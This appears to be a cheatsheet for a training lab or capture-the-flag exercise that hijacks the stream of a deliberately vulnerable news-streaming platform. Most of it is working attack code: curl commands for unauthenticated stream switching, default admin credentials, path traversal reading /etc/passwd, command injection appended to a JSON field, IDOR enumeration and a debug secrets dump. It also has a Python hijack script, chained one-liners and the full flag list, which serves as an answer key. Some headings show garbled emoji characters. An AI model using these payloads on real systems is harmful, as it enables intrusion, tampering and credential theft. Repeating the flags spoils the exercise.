# üéØ Stream Hijacking - Quick Exploit Cheatsheet

## üöÄ Quick Start - Hijack the Stream in 3 Steps!

### Method 1: Direct Video Switch (No Auth Required!)
```bash
# Step 1: Check what's available
curl http://manage.ann-news.live/api/vulns/list | jq

# Step 2: Upload your video at https://manage.ann-news.live
# Login: admin / admin123

# Step 3: Switch the stream (INSTANT HIJACK!)
curl -X POST http://manage.ann-news.live/api/switch-video \
     -H "Content-Type: application/json" \
     -d '{"video": "YOUR-VIDEO-NAME.mp4"}'

# Watch your video at: https://ann-news.live
```

---

## üî• All Vulnerability Endpoints

```bash
# 1. Switch Video (No Auth) - EASIEST!
curl -X POST http://manage.ann-news.live/api/switch-video \
     -H "Content-Type: application/json" \
     -d '{"video": "videoplayback.mp4"}'

# 2. Get System Config (Credentials Exposed)
curl http://manage.ann-news.live/api/debug/config

# 3. Path Traversal (Read Any File)
curl "http://manage.ann-news.live/api/video-info?path=../../etc/passwd"

# 4. Command Injection (Execute Commands)
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; ls -la /opt/videos"}'

# 5. IDOR (Access User Data)
curl http://manage.ann-news.live/api/admin/user/1
curl http://manage.ann-news.live/api/admin/user/2

# 6. Weak Sessions (Predictable Tokens)
curl -X POST http://manage.ann-news.live/api/create-session \
     -H "Content-Type: application/json" \
     -d '{"username": "admin"}'

# 7. List All Vulnerabilities
curl http://manage.ann-news.live/api/vulns/list | jq
```

---

## üíª Using Burp Suite

```
1. Set proxy to 127.0.0.1:8080
2. Visit https://manage.ann-news.live
3. Capture request to /api/switch-video
4. Send to Repeater
5. Modify JSON body: {"video": "your-video.mp4"}
6. Send request
7. Watch hijacked stream at https://ann-news.live
```

---

## üé• Upload Your Own Video

### Via Web Interface:
1. Go to `https://manage.ann-news.live`
2. Login: `admin` / `admin123`
3. Upload your video file (.mp4, .mov, .mkv, .ts)
4. Use exploit to switch stream

### Via curl (if you have the video locally):
```bash
# Login first to get session cookie
curl -c cookies.txt -X POST http://manage.ann-news.live/api/login \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "admin123"}'

# Upload video
curl -b cookies.txt -X POST http://manage.ann-news.live/api/upload \
     -F "file=@/path/to/your/video.mp4"

# Switch to your video (NO AUTH NEEDED!)
curl -X POST http://manage.ann-news.live/api/switch-video \
     -H "Content-Type: application/json" \
     -d '{"video": "video.mp4"}'
```

---

## üïµÔ∏è Reconnaissance Commands

```bash
# Find all video files
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; find /opt -name *.mp4"}'

# Check current video
curl "http://manage.ann-news.live/api/video-info?path=../../../tmp/current_video.txt"

# List uploaded videos (requires auth)
curl -b cookies.txt http://manage.ann-news.live/api/list

# Get system info
curl -X POST http://manage.ann-news.live/api/stream-control \
     -H "Content-Type: application/json" \
     -d '{"action": "restart; uname -a"}'
```

---

## üéì All Flags

```
PENTESTER{uns3cur3_4p1_n0_4uth}      - Missing Auth
PENTESTER{p4th_tr4v3rs4l_vuln}       - Path Traversal
PENTESTER{c0mm4nd_1nj3ct10n}         - Command Injection
PENTESTER{1d0r_4cc3ss_c0ntr0l}       - IDOR
PENTESTER{d3bug_1nf0_l34k}           - Info Disclosure
PENTESTER{w34k_s3ss10n_t0k3n}        - Weak Sessions
INSTRUCTOR{c0mpl3t3d_4ll_vulns}      - Complete All
```

---

## üîß Python Exploitation Script

```python
#!/usr/bin/env python3
import requests
import json

# Configuration
BASE_URL = "http://manage.ann-news.live"
VIDEO_NAME = "hacked.mp4"

def hijack_stream():
    print("[*] Hijacking live stream...")
    
    # Exploit: No authentication required!
    url = f"{BASE_URL}/api/switch-video"
    data = {"video": VIDEO_NAME}
    
    response = requests.post(url, json=data)
    
    if response.status_code == 200:
        print("[+] SUCCESS! Stream hijacked!")
        print(f"[+] Watch at: https://ann-news.live")
        result = response.json()
        if 'hint' in result:
            print(f"[+] FLAG: {result['hint']}")
    else:
        print(f"[-] Failed: {response.text}")

if __name__ == "__main__":
    hijack_stream()
```

---

## üéØ One-Liner Exploits

```bash
# Get all secrets in one command
curl -s http://manage.ann-news.live/api/debug/config | jq '.config'

# List and switch to first video
VIDEO=$(curl -s -X POST http://manage.ann-news.live/api/stream-control \
    -H "Content-Type: application/json" \
    -d '{"action": "restart; ls /opt/videos | head -1"}' | jq -r '.output') && \
curl -X POST http://manage.ann-news.live/api/switch-video \
    -H "Content-Type: application/json" \
    -d "{\"video\": \"$VIDEO\"}"

# Extract all flags at once
for i in 1 2 3; do curl -s http://manage.ann-news.live/api/admin/user/$i | jq '.hint'; done
```

---

## ‚ö° Pro Tips

1. **Test in order**: Start with easiest vulnerability first
2. **Use jq**: Pipe responses to `jq` for readable JSON
3. **Save cookies**: Use `-c cookies.txt` and `-b cookies.txt` with curl
4. **Watch logs**: Changes take 3-5 seconds to reflect on stream
5. **Verify**: Always check https://ann-news.live after exploitation

---

## üìù Report Template

```markdown
# Penetration Test Report: Live Streaming Platform

## Executive Summary
Multiple critical vulnerabilities discovered allowing unauthorized stream hijacking.

## Vulnerabilities Found
1. Missing Authentication on /api/switch-video [CRITICAL]
2. Command Injection in /api/stream-control [CRITICAL]
3. Path Traversal in /api/video-info [HIGH]
4. IDOR in /api/admin/user [HIGH]
5. Information Disclosure in /api/debug/config [HIGH]
6. Weak Session Management [MEDIUM]

## Proof of Concept
[Include screenshots and commands]

## Impact
- Unauthorized stream hijacking
- Complete system compromise
- Data exfiltration
- Reputation damage

## Remediation
[Your recommendations here]
```

---

**Remember: Only exploit systems you have permission to test! üõ°Ô∏è**

